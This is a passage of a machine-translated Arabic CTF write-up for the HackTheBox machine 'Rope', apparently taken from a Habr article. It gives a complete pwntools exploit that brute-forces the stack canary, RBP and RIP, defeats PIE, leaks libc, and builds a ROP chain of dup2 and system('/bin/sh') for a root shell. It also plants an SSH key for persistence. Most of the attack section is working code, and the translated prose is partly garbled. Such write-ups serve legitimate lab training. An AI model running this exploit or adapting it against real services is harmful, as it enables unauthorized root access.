<img src="https://habrastorage.org/webt/bn/l8/qn/bnl8qnuxwllqpudd8mcuzrtchn0.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุจุชูุฒูู ุงูุชุทุจูู ููุณู ูููุชุจุฉ libc ุงูุชู ูุณุชุฎุฏููุง. ููุงุญุธ ุฃู ASLR ูุดุท ุนูู ุงููุถูู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ye/u2/91/yeu291nh107sotdzw9i5hxmyoww.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุชุญูู ูู ุญูุงูุฉ ุงูุชุทุจูู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lw/2q/0t/lw2q0t15j1qmapfuhy9oppeqkgg.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงููู ุฅูู ุฃูุตู ุญุฏ. ุฃู ุ ุฅุฐุง ูุฌุฏูุง ุชุฌุงูุฒูุง ูู ุณุนุฉ ุงููุฎุฒู ุงููุคูุช ุ ูุณูู ูุญุชุงุฌ ุฅูู ุชุฎููู ุงูููุงุฑู (ุงููููุฉ ุงูุชู ุชู ุงูุชุญูู ูููุง ูุจู ุงูุฎุฑูุฌ ูู ุงููุธููุฉ ููุชุญูู ูู ุณูุงูุฉ ุงููุฎุฒู ุงููุคูุช) ุ ููุฃุณููุจ ูุงุณุชุบูุงู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ุ ุณูุณุชุฎุฏู ROP (ุงูุชู ูุชุจุช ุนููุง ุจุจุนุถ ุงูุชูุงุตูู</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุง</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). ุฏุนููุง ููุชุญ ุงูุจุฑูุงูุฌ ูู ุฃู ุฃุฏุงุฉ ุชูููู ุจูุญูู ููุงุฆู ูู (ุฃุณุชุฎุฏู IDA Pro). ูููู ุจูู ุงููุธููุฉ ุงูุฑุฆูุณูุฉ ุงูุฑุฆูุณูุฉ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/st/jx/lo/stjxlocl4sv3gh_6j8euvybdayq.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุซุงู ุนูู ุงูููุงุฑู ูู ุงููุชุบูุฑ v10 ุ ุงูุฐู ุชู ุชุนูููู ูู ุจุฏุงูุฉ ุงูุฏุงูุฉ. ุฏุนููุง ูุฑู ูุง ูู ูุธููุฉ sub_1267 ุงููุณุคููุฉ ุนููุง. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/km/gi/aj/kmgiajki9-zlvdzxxfqaeqt2dn8.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุญุชู ููุง ููุชุญ ุงููููุฐ ููุงุณุชูุงุน. ููููู ุฅุนุงุฏุฉ ุชุณููุชู ุฅูู is_listen () ุ ูุฐูุจ ุฃุจุนุฏ ูู ุฐูู. ุงููุธููุฉ ุงูุชุงููุฉ ุงููุนุฑูุฉ ูู ูุจู ุงููุณุชุฎุฏู ูู sub_14EE. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hn/mn/bn/hnmnbnmswumhkazbc6aysanetbc.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจู ุงูุฅุฑุณุงู ุ ููุงู ูุธููุฉ ูุณุชุฎุฏู ุฃุฎุฑู. ูุญู ููุธุฑ ุฅูููุง.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/2d/7k/fb/2d7kfbhkjqnz8eidg8i95km_yey.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููุฐุง ุ ูู ูุฐู ุงููุธููุฉ ุ ูุชู ุชููู ุณูุณูุฉ ุชุตู ุฅูู 0x400 ุจุงูุช ููุชุงุจุชูุง ูู ุงููุฎุฒู ุงููุคูุช. </font><font style="vertical-align: inherit;">ูุดูุฑ ุงูุชุนููู ุนูู buf ุงููุชุบูุฑ ุฅูู ุงูุนููุงู ุงููุชุนูู ุจูุงุนุฏุฉ ุฅุทุงุฑ ุงูููุฏุณ ุงูุญุงูู (rbp) - [rbp-40h] ุ ููููุชุบูุฑ v3 (canary) ุนููุงู ูุณุจู [rbp-8h] ุ ูุฐูู ุจุงููุณุจุฉ ุฅูู ุชุฌุงูุฒ ุณุนุฉ ุงููุฎุฒู ุงููุคูุช ุ ูุญุชุงุฌ ุฅูู ุงููุฒูุฏ [rbp- 8 ุณ] - [rbp-40h] = 0x40-8 = 56 ุจุงูุช. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุฐูู ุชููู ุงูุฎุทุฉ ุนูู ุงููุญู ุงูุชุงูู:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฅูุฌุงุฏ ูุชุฌุงูุฒ ุงูุนุงุฒูุฉ ุ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงุฎูุงุฏ ุงูููุงุฑู ุ rbp ูุชูุฒู ุ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูุธุฑูุง ูุฃู PIE ูุดุท ุ ูุฃูุช ุจุญุงุฌุฉ ุฅูู ุงูุนุซูุฑ ุนูู ุงูุฅุฒุงุญุฉ ุงููุนููุฉ ุ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฅูุฌุงุฏ ุชุณุฑุจ ููุฐุงูุฑุฉ ูุญุณุงุจ ุงูุนููุงู ุงูุฐู ูุชู ุชุญููู ุงูููุชุจุฉ ุนููู ุ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงุฌูุน ROP ุ ุญูุซ ุณูุชู ุฅุนุงุฏุฉ ุชูุฌูู ุฏูู ุงููุงุตูุงุช ุงูููุงุณูุฉ ุฅูู ูุงุตู ุงูุดุจูุฉ ููุจุฑูุงูุฌ ุ ุซู ุงุณุชุฏุนุงุก / bin / sh ูู ุฎูุงู ูุธููุฉ ุงููุธุงู.</font></font></li>
</ol><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. ุชุฌุงูุฒ ุณุนุฉ ุงููุฎุฒู ุงููุคูุช</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุง ูู ููุถุญ ุฃุฏูุงู ุ ุนูุฏ ุฅุฑุณุงู 56 ุจุงูุช ุ ูุณุชูุฑ ุงูุจุฑูุงูุฌ ูู ุงูุนูู ุจุดูู ุทุจูุนู ุ ูููู ุฅุฑุณุงู 57 ุจุงูุช ุ ูุญุตู ุนูู ุงุณุชุซูุงุก. </font><font style="vertical-align: inherit;">ูุจุงูุชุงูู ุ ูุชู ุงูุชูุงู ุณูุงูุฉ ุงูุนุงุฒูุฉ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/kc/pp/sl/kcppslliglpdyxf2v8ikppjoeqa.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุฌุนู ูุงูุจ ุงุณุชุบูุงู. </font><font style="vertical-align: inherit;">ูุธุฑูุง ูุฃูู ุณูููู ูู ุงูุถุฑูุฑู ูุฑุฒ ุงููุซูุฑ ูุฅุนุงุฏุฉ ุชูุตููู ุ ูุณูู ูููู ุจุชุนุทูู ุฅุฎุฑุงุฌ ุฑุณุงุฆู pwntools (log_level).</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
HOST = <span class="hljs-string">'127.0.0.1'</span>
PORT = <span class="hljs-number">1337</span>
context(os = <span class="hljs-string">"linux"</span>, arch = <span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">'error'</span>)<font></font>
<font></font>
pre_payload = <span class="hljs-string">"A"</span> * <span class="hljs-number">56</span><font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.interactive()<font></font>
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.Canary ุ RBP ุ RIP</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุง ุงูุชุดููุง ุ ุจุนุฏ 56 ุจุงูุช ูู ุงููุฎุฒู ุงููุคูุช ุ ููุงู ููุงุฑู ุ ูุจุนุฏ ุฐูู ููุงู ุนูุงููู RBP ู RIP ูู ุงูููุฏุณ ุ ูุงูุชู ุชุญุชุงุฌ ุฃูุถูุง ุฅูู ูุฑุฒูุง. </font><font style="vertical-align: inherit;">ุฏุนูุง ููุชุจ ุฏุงูุฉ ูุทุงุจูุฉ 8 ุจุงูุช.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">qword_brute</span>(<span class="hljs-params">pre_payload, item</span>):</span>
    qword_ = <span class="hljs-string">b""</span>
    <span class="hljs-keyword">while</span> len(qword_) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):<font></font>
            byte = bytes([b])<font></font>
            <span class="hljs-keyword">try</span>:<font></font>
                r = remote(HOST, PORT)<font></font>
                print(<span class="hljs-string">f"<span class="hljs-subst">{item}</span> find: <span class="hljs-subst">{(qword_ + byte).hex()}</span>"</span>, end=<span class="hljs-string">u"\u001b[1000D"</span>)<font></font>
                send_ = pre_payload + qword_ + byte<font></font>
                r.sendafter(<span class="hljs-string">b"admin:"</span>, send_)
                <span class="hljs-keyword">if</span> <span class="hljs-string">b"Done"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.recvall(timeout=<span class="hljs-number">5</span>):
                    <span class="hljs-keyword">raise</span> EOFError<font></font>
                r.close()<font></font>
                qword_ += byte<font></font>
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">except</span> EOFError <span class="hljs-keyword">as</span> error:<font></font>
                r.close()<font></font>
    context.log_level=<span class="hljs-string">'info'</span>            
    log.success(<span class="hljs-string">f"<span class="hljs-subst">{item}</span> found: <span class="hljs-subst">{hex(u64(qword_))}</span>"</span>)<font></font>
    context.log_level=<span class="hljs-string">'error'</span> 
    <span class="hljs-keyword">return</span> qword_
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุญุชู ูุชููู ูู ุฅูุดุงุก ุงูุชุญููู ุงููุณุจู:</font></font><br>
<br>
<pre><code class="python hljs">pre_payload = <span class="hljs-string">b"A"</span> * <span class="hljs-number">56</span>
CANARY = qword_brute(pre_payload, <span class="hljs-string">"CANARY"</span>)<font></font>
pre_payload += CANARY<font></font>
RBP = qword_brute(pre_payload, <span class="hljs-string">"RBP"</span>)<font></font>
pre_payload += RBP<font></font>
RIP = qword_brute(pre_payload, <span class="hljs-string">"RIP"</span>)
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. ูุทูุฑุฉ</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุฏุนููุง ูุชุนุงูู ูุน PIE. </font><font style="vertical-align: inherit;">ูุฌุฏูุง RIP - ูุฐุง ูู ุนููุงู ุงูุฅุฑุฌุงุน ุญูุซ ูุนูุฏ ูู ุงููุธููุฉ. </font><font style="vertical-align: inherit;">ูุจุงูุชุงูู ุ ูููููุง ุทุฑุญ ููู ุนููุงู ุงููุฑุณู ูู ุงูููุฏ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/te/t7/lu/tet7luif_rfxtdpgk8cw1a6wat8.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ุ ูุฅู ุงูุฅุฒุงุญุฉ ูู ุงููุงุนุฏุฉ ูู 0x1562. </font><font style="vertical-align: inherit;">ุฏุนูุง ูุดูุฑ ุฅูู ุงูุนููุงู ุงูุญูููู ููุชุทุจูู ููุฏ ุงูุชุดุบูู.</font></font><br>
<br>
<pre><code class="python hljs">base_binary = u64(RIP) - <span class="hljs-number">0x1562</span>
binary = ELF(<span class="hljs-string">'./contact'</span>)<font></font>
binary.address = base_binary<font></font>
libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. ุชุณุฑุจ ุงูุฐุงูุฑุฉ</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุณุชุฎุฏู ุงูุชุทุจูู ูุธููุฉ ุงููุชุงุจุฉ ุงูููุงุณูุฉ () ูุนุฑุถ ุณูุณูุฉ ุงููุทุงูุจุฉ ุ ูุงูุชู ุชุฃุฎุฐ ููุจุถูุง ููุฅุฎุฑุงุฌ ูุงููุฎุฒู ุงููุคูุช ูุญุฌูู. </font><font style="vertical-align: inherit;">ูููููุง ุงุณุชุฎุฏุงู ูุฐู ุงููุธููุฉ. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุฃุฌู ุงูุฑุงุญุฉ ุ ุฏุนูุง ูุณุชุฎุฏู ูุญุฏุฉ ROP ูู pwntools. </font><font style="vertical-align: inherit;">ุจุงุฎุชุตุงุฑ ุ ููู ูููุงุฐุง ูุชู ุชูุฏูู ูุฐุง ุงูุนูู ูู ุงูุตูุฑุฉ ุฃุฏูุงู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/oh/md/bv/ohmdbvozmm5ve0zayx1imk5v-0a.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุญุตู ุนูู ุชุณุฑุจ ุ ุณูุชูุญ ููุง ุฐูู ูุนุฑูุฉ ุงูุนููุงู ุงูุฐู ุชูุฌุฏ ููู ูุธููุฉ ุงููุชุงุจุฉ ูู ููุชุจุฉ libc ุงููุญููุฉ.</font></font><br>
<br>
<pre><code class="python hljs">rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x4</span>, binary.got[<span class="hljs-string">'write'</span>], <span class="hljs-number">0x8</span>)<font></font>
send_leak = pre_payload + flat(rop_binary.build())<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendafter(<span class="hljs-string">b"admin:"</span>, send_leak)<font></font>
leak = r.recvall().strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>)<font></font>
print(<span class="hljs-string">f"Leak: <span class="hljs-subst">{hex(u64(leak))}</span>"</span>)<font></font>
base_libc = leak - libc.symbols[<span class="hljs-string">'write'</span>]
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.ROP</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ูุบูุฑ ุงูุนููุงู ุงูุฃุณุงุณู ูููุชุจุฉ libc ููุนุซุฑ ุนูู ุนููุงู ุงูุณุทุฑ / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">libc.address = base_libc<font></font>
shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจูู ุฌูุน ROP ุ ุญูุซ ุณูุชู ุฅุนุงุฏุฉ ุชูุฌูู ูุงุตูุงุช ุงูุฅุฏุฎุงู / ุงูุฅุฎุฑุงุฌ ุงูููุงุณูุฉ (0ุ1ุ2) ุฅูู ุงููุงุตู ุงููุณุฌู ูู ุงูุจุฑูุงูุฌ (4). </font><font style="vertical-align: inherit;">ุจุนุฏ ุฐูู ุณูุชู ุงุณุชุฏุนุงุก ูุธููุฉ ุงููุธุงู ุ ุญูุซ ุณูููู ุจุชูุฑูุฑ ุนููุงู ุงูุณุทุฑ / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">4</span>, <span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
<font></font>
payload = pre_payload + flat(rop_libc.build())<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendafter(<span class="hljs-string">b"admin:"</span>, payload)<font></font>
time.sleep(<span class="hljs-number">2</span>)<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
6. ุนูููุฉ </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุฏ ุงุณุชุบูุงู ูุงูู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hm/ta/sd/hmtasdfdb2vvug5doqfdkfzeho4.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุนูู ุงูุฎุงุฏู ุ ุงูุชุจ ููุชุงุญ ssh ููููู /home/r4j/.ssh/authorizef_keys. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ze/e2/7v/zee27vga9_skxu2ruepdreh0hxm.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฃุนุฏ ุชูุฌูู ุงููููุฐ (ุชุฃูุฏ ูู ุฅุนุงุฏุฉ ุชูุฌูู ุงูุงุชุตุงู ูู ุงููููุฐ ุงููุญูู 1337 ุนุจุฑ SSH ุฅูู ุงููููุฐ 1337 ูููุถูู ุงูุจุนูุฏ).</font></font><br>
<br>
<pre><code class="bash hljs">ssh -L 1337:127.0.0.1:1337 -i id_rsa r4j@rope.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฅุทูุงู ุงุณุชุบูุงู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mv/cy/m5/mvcym58okghfhc1ngkz9oovt4-4.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญู ูุนูู ุชุญุช ุงูุฌุฐุฑ. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููููู ุงูุงูุถูุงู ุฅูููุง ุนูู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">ููุงู ููููู ุงูุนุซูุฑ ุนูู ููุงุฏ ูุซูุฑุฉ ููุงูุชูุงู ุ ูุฏูุฑุงุช ูุฏูุฌุฉ ุ ุจุงูุฅุถุงูุฉ ุฅูู ุงูุจุฑุงูุฌ. </font><font style="vertical-align: inherit;">ุฏุนููุง ูุฌูุน ูุฌุชูุนูุง ุณูููู ููู ุฃูุงุณ ุนูู ุฏุฑุงูุฉ ูู ุงูุนุฏูุฏ ูู ูุฌุงูุงุช ุชูููููุฌูุง ุงููุนูููุงุช ุ ุซู ูููููุง ุฏุงุฆููุง ูุณุงุนุฏุฉ ุจุนุถูุง ุงูุจุนุถ ูู ุฃู ูุถุงูุง ุชุชุนูู ุจุชูููููุฌูุง ุงููุนูููุงุช ูุฃูู ุงููุนูููุงุช.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar503404/index.html">ุงูุฃูุธูุฉ ุงูุฑูููุฉ ุงูุฏูุงููุฉ</a></li>
<li><a href="../ar503406/index.html">ุฏูุงูุงุช ูุงููุดุงุท</a></li>
<li><a href="../ar503408/index.html">ูุชุฌุฑ Blazor Client Side Online Online: ุงูุฌุฒุก 7 - ุชู ุชุญุฏูุซู ูุฅุตุฏุงุฑ ุงูุฅุตุฏุงุฑ 3.2.0 ูุฅุถุงูุฉ ุนุฑุถ ุงูุตูุฑ</a></li>
<li><a href="../ar503410/index.html">ุงููุถูุนุงุช ุนุงูู ุขุฎุฑ: ุณูุฌุง ุฌูููุณูุณ</a></li>
<li><a href="../ar503412/index.html">Project Loom: ูุคุดุฑุงุช ุชุฑุงุจุท Java ุงูุงูุชุฑุงุถูุฉ ูุฑูุจุฉ</a></li>
<li><a href="../ar503420/index.html">Lemmatize ุจุดูู ุฃุณุฑุน (PyMorphy2 ู PyMystem3 ูุจุนุถ ุงูุณุญุฑ)</a></li>
<li><a href="../ar503426/index.html">44.2 ุชูุฑุงุจุงูุช / ุซุงููุฉ ุนุจุฑ ุงูุฃููุงู - ููู ูุนููุ</a></li>
<li><a href="../ar503428/index.html">ููููุฉ ุชุญุณูู ุงููุบุฉ ุงูุฅูุฌููุฒูุฉ ุงูููุชูุจุฉ ููุชูุงุตู ูู ุงูุฎุงุฑุฌ: ูุดุฑูุน ุงูุฃุนูุงู Linguix</a></li>
<li><a href="../ar503430/index.html">ุจูุงุจุฉ MS Remote Desktop ู HAProxy ููููุฉ ุงููุฑูุฑ</a></li>
<li><a href="../ar503432/index.html">ุฎุงุฏู TCP / IP ูุชุนุฏุฏ ุงูุฎููุท ุนุจุฑ ุงูุฃูุธูุฉ ุงูุฃุณุงุณูุฉ ูู C ++</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>